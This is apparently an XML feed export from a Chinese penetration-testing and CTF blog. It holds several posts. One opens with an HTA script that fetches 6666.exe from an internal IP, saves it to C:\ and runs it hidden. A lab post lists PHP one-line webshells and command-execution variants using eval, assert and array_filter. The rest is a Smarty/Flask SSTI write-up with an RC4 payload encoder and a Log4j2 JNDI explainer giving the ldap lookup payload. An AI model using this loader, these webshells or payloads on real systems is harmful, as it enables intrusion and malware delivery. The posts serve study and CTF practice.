然后调用Object.open()方法打开一个GET请求，指定要下载的文件的URL地址<br>// 最后一个参数为false表示同步请求，即等待服务器响应后再执行下一条语句<br>// 使用Object.send()方法发送请求并获取响应内容<br>var Object = new ActiveXObject(&quot;MSXML2.XMLHTTP&quot;);<br>Object.open(&quot;GET&quot;,&quot;http://192.168.81.229/6666.exe&quot;,false);<br>Object.send();<br><br>// 检查Object.Status的值是否等于200，表示HTTP响应的状态码是否为成功。<br>// 响应成功，就使用new ActiveXObject()方法创建一个名为Stream的ADODB.Stream对象，用于将响应内容保存到本地文件<br>// 然后调用Stream.Open()方法打开流，调用Stream.Type = 1方法设置流数据类型为二进制<br>// 调用Stream.Write()方法写入响应内容，最后调用Stream.SaveToFile()方法将流数据保存到本地文件&quot;C:\6666.exe&quot;中<br>// 使用new ActiveXObject()方法创建一个名为Shell的Wscript.Shell对象，用于运行本地可执行文件<br>// 调用Shell.Run()方法运行C:\6666.exe文件<br>// 调用Stream.Close()方法关闭流，调用window.close()方法关闭窗口<br>if (Object.Status == 200)<br>&#123;<br>    var Stream = new ActiveXObject(&quot;ADODB.Stream&quot;);<br>    Stream.Open();<br>    Stream.Type = 1;<br>    Stream.Write(Object.ResponseBody);<br>    Stream.SaveToFile(&quot;C:\\6666.exe&quot;, 2);<br>    Stream.Close();<br>    var Shell = new ActiveXObject(&quot;Wscript.Shell&quot;);<br>    Shell.Run(&quot;C:\\6666.exe&quot;);<br>&#125;<br>window.close();<br>&lt;/script&gt;<br>&lt;HTA:APPLICATION ID=&quot;test&quot; WINDOWSTATE = &quot;minimize&quot;&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php_exec</title>
    <link href="/2024/01/22/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/php-exec/"/>
    <url>/2024/01/22/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/php-exec/</url>
    
    <content type="html"><![CDATA[<h1 id="array-filter"><a href="#array-filter" class="headerlink" title="array_filter"></a>array_filter</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$array1</span>=<span class="hljs-keyword">array</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-variable">$func</span> =<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func&#x27;</span>];<br><span class="hljs-title function_ invoke__">array_filter</span>(<span class="hljs-variable">$array1</span>,<span class="hljs-variable">$func</span>);<br><br><span class="hljs-comment">//用回调函数过滤数组中的元素：array_filter(数组,函数)</span><br><span class="hljs-comment">//?func=system</span><br><span class="hljs-comment">//cmd=whoami</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/php-exec/image-20240122001540451.png" alt="image-20240122001540451"></p><p>array_filter就是让每一个数组里面的成员都执行一遍回到函数，这个可以考虑python 的map</p><h1 id="array-map"><a href="#array-map" class="headerlink" title="array_map"></a>array_map</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$func</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func&#x27;</span>];<br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$array</span>[<span class="hljs-number">0</span>]=<span class="hljs-variable">$cmd</span>;<br><span class="hljs-variable">$new_array</span>=<span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$array</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$new_array</span>;<br><span class="hljs-comment">//array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>和array_filter一样的</p><h1 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这个就是一句话木马</p><p>只不过这个我们得使用system等函数</p><p>而且需要注意有一些函数他不返回结果的(exec,shell_exec)</p><p>但是会被执行</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/php-exec/image-20240122002353663.png" alt="image-20240122002353663"></p><h1 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array"></a>call_user_func_array</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$array</span>[<span class="hljs-number">0</span>]=<span class="hljs-variable">$cmd</span>;<br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-variable">$array</span>);<br><span class="hljs-comment">//将传入的参数作为数组的第一个值传递给assert函数</span><br><span class="hljs-comment">//cmd=system(whoami)</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/php-exec/image-20240122002535439.png" alt="image-20240122002535439"></p><h1 id="call-user-func-php"><a href="#call-user-func-php" class="headerlink" title="call_user_func.php"></a>call_user_func.php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-comment">//传入的参数作为assert函数的参数</span><br><span class="hljs-comment">//cmd=system(whoami)</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/php-exec/image-20240122002659328.png" alt="image-20240122002659328"></p><h1 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h1><p>一句话木马不多说</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h1><p>这个函数不会输出浏览器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// 输出运行中的 php/httpd 进程的创建者用户名</span><br><span class="hljs-comment">// （在可以执行 &quot;whoami&quot; 命令的系统上）</span><br><span class="hljs-comment">//echo exec(&#x27;whoami&#x27;);</span><br><span class="hljs-comment">//exec(&#x27;whoami&#x27;, $return);</span><br><span class="hljs-comment">//var_dump($return);</span><br><br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>@<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$cmd</span>, <span class="hljs-variable">$return</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$return</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>就和system 是一个效果</p><h1 id="passthru-php"><a href="#passthru-php" class="headerlink" title="passthru.php"></a>passthru.php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$post</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">passthru</span>(<span class="hljs-variable">$post</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$output</span>&quot;</span>;<br><br></code></pre></td></tr></table></figure><h1 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$fd</span> = <span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-string">&quot;whoami&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>);<br><span class="hljs-variable">$ret</span> = <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$fd</span>);<br><span class="hljs-keyword">print</span>(<span class="hljs-variable">$ret</span>);<br><br><span class="hljs-comment">// $fd = popen(&quot;systeminfo &gt; D:\\1.txt&quot;, &#x27;r&#x27;);</span><br><span class="hljs-comment">// pclose($fd);</span><br><span class="hljs-comment">// print(fgets(fopen(&quot;d:\\1.txt&quot;,&#x27;r&#x27;)));</span><br><span class="hljs-comment">// $handle = fopen(&quot;D:\\1.txt&quot;, &quot;r&quot;);</span><br><span class="hljs-comment">// $contents = fread($handle, 100000);</span><br><span class="hljs-comment">// fclose($handle);</span><br><span class="hljs-comment">// echo &quot;&lt;pre&gt;$contents&lt;/pre&gt;&quot;;</span><br><br><span class="hljs-comment">// $fd = popen(&quot;ipconfig&quot;,&#x27;r&#x27;);</span><br><span class="hljs-comment">// while($s=fgets($fd))&#123;</span><br><span class="hljs-comment">// echo &quot;&lt;pre&gt;$s&lt;/pre&gt;&quot;;</span><br><span class="hljs-comment">// &#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/php-exec/image-20240122003506918.png" alt="image-20240122003506918"></p><h1 id="shell-exec-php"><a href="#shell-exec-php" class="headerlink" title="shell_exec.php"></a>shell_exec.php</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-string">&#x27;ls -lart&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">$output</span>&lt;/pre&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/php-exec/image-20240122004650284.png" alt="image-20240122004650284"></p><h1 id="system"><a href="#system" class="headerlink" title="system"></a>system</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span>;<br><br><span class="hljs-comment">// 输出 shell 命令 &quot;ls&quot; 的返回结果</span><br><span class="hljs-comment">// 并且将输出的最后一样内容返回到 $last_line。</span><br><span class="hljs-comment">// 将命令的返回值保存到 $retval。</span><br><span class="hljs-variable">$last_line</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>, <span class="hljs-variable">$retval</span>);<br><br><span class="hljs-comment">// 打印更多信息</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;/pre&gt;</span><br><span class="hljs-string">&lt;hr /&gt;Last line of the output: &#x27;</span> . <span class="hljs-variable">$last_line</span> . <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;hr /&gt;Return value: &#x27;</span> . <span class="hljs-variable">$retval</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/php-exec/image-20240122004747559.png" alt="image-20240122004747559"></p>]]></content>
    
    
    
    <tags>
      
      <tag>靶场记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>File_Upload</title>
    <link href="/2024/01/21/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/File-Upload/"/>
    <url>/2024/01/21/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/File-Upload/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
    <tags>
      
      <tag>靶场记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ssti</title>
    <link href="/2024/01/21/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/ssti/"/>
    <url>/2024/01/21/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/ssti/</url>
    
    <content type="html"><![CDATA[<h1 id="smart-ssti"><a href="#smart-ssti" class="headerlink" title="smart ssti"></a>smart ssti</h1><h2 id="CISCN-2019华东南-Web11"><a href="#CISCN-2019华东南-Web11" class="headerlink" title="[CISCN 2019华东南]Web11"></a>[CISCN 2019华东南]Web11</h2><p><strong>0x00</strong></p><p>关键点 xff + Smarty</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/ssti/image-20240121145321966.png" alt="image-20240121145321966"></p><p><strong>0x01</strong></p><p>根据提示使用</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/ssti/image-20240121145429285.png" alt="image-20240121145429285"></p><p>发现执行了，</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/ssti/image-20240121145510188.png" alt="image-20240121145510188"></p><p><strong>0x02</strong></p><p>代码执行system()</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/ssti/image-20240121145555810.png" alt="image-20240121145555810"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/ssti/image-20240121145614252.png" alt="image-20240121145614252"></p><p>发现并没有存在</p><p>看源码</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/ssti/image-20240121145703598.png" alt="image-20240121145703598"></p><h1 id="flask"><a href="#flask" class="headerlink" title="flask"></a>flask</h1><h2 id="HNCTF-2022-WEEK2-ez-SSTI"><a href="#HNCTF-2022-WEEK2-ez-SSTI" class="headerlink" title="[HNCTF 2022 WEEK2]ez_SSTI"></a>[HNCTF 2022 WEEK2]ez_SSTI</h2><p>0x00</p><p>模板注入</p><p>0x01</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/image-20240131211818243.png" alt="image-20240131211818243"><br>使用hackbar自带的</p><h2 id="NISACTF-2022-is-secret"><a href="#NISACTF-2022-is-secret" class="headerlink" title="[NISACTF 2022]is secret"></a>[NISACTF 2022]is secret</h2><p>0x00</p><p>这道题挺难的</p><p>使用的知识点</p><ul><li>ssti  flask</li><li>rce</li></ul><p>0x01</p><p>首先</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203231956350.png" alt="image-20240203231956350"></p><p>查找一圈只发现了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203232019419.png" alt="image-20240203232019419"></p><p>使用的框架</p><p>通过目录扫描</p><p>发现了secret 目录</p><p>0x02</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203232125435.png" alt="image-20240203232125435"></p><p>发现通过get 传参的方式给他说秘密</p><p>然后我就随便说了一个</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203232308690.png" alt="image-20240203232308690"></p><p>每理解到，尝试判断是否存在模板注入</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203232510998.png" alt="image-20240203232510998"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203232523216.png" alt="image-20240203232523216"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203232535937.png" alt="image-20240203232535937"></p><p>0x03</p><p>使用下面的脚本进行rc4加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_main</span>(<span class="hljs-params">key=<span class="hljs-string">&quot;init_key&quot;</span>, message=<span class="hljs-string">&quot;init_message&quot;</span></span>):  <span class="hljs-comment"># 返回加密后得内容</span><br>    s_box = rc4_init_sbox(key)<br>    crypt = <span class="hljs-built_in">str</span>(rc4_excrypt(message, s_box))<br>    <span class="hljs-keyword">return</span> crypt<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_init_sbox</span>(<span class="hljs-params">key</span>):<br>    s_box = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s_box[i] + <span class="hljs-built_in">ord</span>(key[i % <span class="hljs-built_in">len</span>(key)])) % <span class="hljs-number">256</span><br>        s_box[i], s_box[j] = s_box[j], s_box[i]<br>    <span class="hljs-keyword">return</span> s_box<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_excrypt</span>(<span class="hljs-params">plain, box</span>):<br>    res = []<br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> plain:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + box[i]) % <span class="hljs-number">256</span><br>        box[i], box[j] = box[j], box[i]<br>        t = (box[i] + box[j]) % <span class="hljs-number">256</span><br>        k = box[t]<br>        res.append(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s) ^ k))<br>    cipher = <span class="hljs-string">&quot;&quot;</span>.join(res)<br>    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">str</span>(base64.b64encode(cipher.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)), <span class="hljs-string">&#x27;utf-8&#x27;</span>))<br> <br> <br>key = <span class="hljs-string">&quot;HereIsTreasure&quot;</span>  <span class="hljs-comment"># 此处为密文</span><br>message = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入明文:\n&quot;</span>)<br>enc_base64 = rc4_main(key, message)<br>enc_init = <span class="hljs-built_in">str</span>(base64.b64decode(enc_base64), <span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>enc_url = parse.quote(enc_init)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;rc4加密后的url编码:&quot;</span> + enc_url)<br><span class="hljs-comment"># print(&quot;rc4加密后的base64编码&quot;+enc_base64)</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203233709207.png" alt="image-20240203233709207"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20240203233719628.png" alt="image-20240203233719628"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF刷题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Log4j2</title>
    <link href="/2024/01/20/%E6%B8%97%E9%80%8F/Log4j2/"/>
    <url>/2024/01/20/%E6%B8%97%E9%80%8F/Log4j2/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Apache log4j 是Apache 的一个开源项目， Apache log4j2 是一个Java 的日志记录工具。该工具重写了log4j 框架，并且引入了大量丰富的特性。我们可以控制日志信息输送的目的地为控制台、文件、GUI组件等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。</p><h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>log4j2 中存在JNDI 注入漏洞，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目标服务器上执行任意代码。</p><p>下面是触发漏洞的两部分关键代码：</p><ol><li>org.apache.logging.log4j.core.pattern.MessagePatternConverter 的 format() 方法（表达式内容替换）：<br>  这部分内容重点就在于代码的主要内容就是一旦发现日志中包含 ${ 就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执行。在 ${ 中可以使用的部分关键词如下：</li></ol><p>  log4j2</p>  <figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">$&#123;java:version&#125;    <span class="hljs-built_in">getSystemProperty</span>(&quot;java.version&quot;)<br>$&#123;java:runtime&#125;    <span class="hljs-built_in">getRuntime</span>()<br>$&#123;java:vm&#125;    <span class="hljs-built_in">getVirtualMachine</span>()<br>$&#123;java:os&#125;    <span class="hljs-built_in">getOperatingSystem</span>()<br>$&#123;java:hw&#125;    <span class="hljs-built_in">getHardware</span>()<br>$&#123;java:locale&#125;    <span class="hljs-built_in">getLocale</span>()<br></code></pre></td></tr></table></figure><p>  linux</p>  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;<span class="hljs-built_in">env</span>:CLASSPATH&#125;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;<span class="hljs-built_in">env</span>:HOME&#125;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;<span class="hljs-built_in">env</span>:JAVA_HOME&#125;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;<span class="hljs-built_in">env</span>:LANG&#125;</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">&#123;<span class="hljs-built_in">env</span>:LC_TERMINAL&#125;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>apache.logging.log4j.core.lookup.StrSubstitutor（提取字符串，并通过 lookup 进行内容替换）</li></ol><p>  日志在打印时当遇到 ${ 后，Interpolator 类以:号作为分割，将表达式内容分割成两部分，前面部分作<br>  为 preﬁx，后面部分作为 key。然后通过 preﬁx 去找对应的 lookup，通过对应的 lookup 实例调用lookup 方法，最后将 key 作为参数带入执行。<br>  由于log4j2 支持很多协议，例如通过 ldap 查找变量，通过 docker 查找变量，通过rmi等等。目前看到使用最多的主要是使用ldap来构造payload:</p>  <figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$&#123;jndi:ldap:<span class="hljs-regexp">//ip</span><span class="hljs-regexp">/port/</span><span class="hljs-keyword">exp</span>&#125;<br></code></pre></td></tr></table></figure><p>  最终效果就是通过 jndi 注入，借助 ldap 服务来下载执行恶意 payload，从而执行命令<br>  整个利用流程分两步：<br>  第一步：向目标发送指定 payload，目标对 payload 进行解析执行，然后会通过 ldap 链接远程服务，当 ldap 服务收到请求之后，将请求进行重定向到恶意 java class 的地址。<br>  第二步：目标服务器收到重定向请求之后，下载恶意 class 并执行其中的代码，从而执行系统命令。</p><h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><ol><li><p>影响组件应用</p><blockquote><p>Apache Struts2<br>Apache Solr Apache Druid Apache Flink<br>srping-boot-strater-log4j2</p></blockquote></li><li><p>影响Log4j版本</p><blockquote><p>Apache Log4j 2.0 ~ 2.15.0-rc1</p></blockquote></li></ol><h1 id="证明漏洞"><a href="#证明漏洞" class="headerlink" title="证明漏洞"></a>证明漏洞</h1><p>http: &#x2F;&#x2F;dnslog.cn&#x2F;<br>https: &#x2F;&#x2F;<a 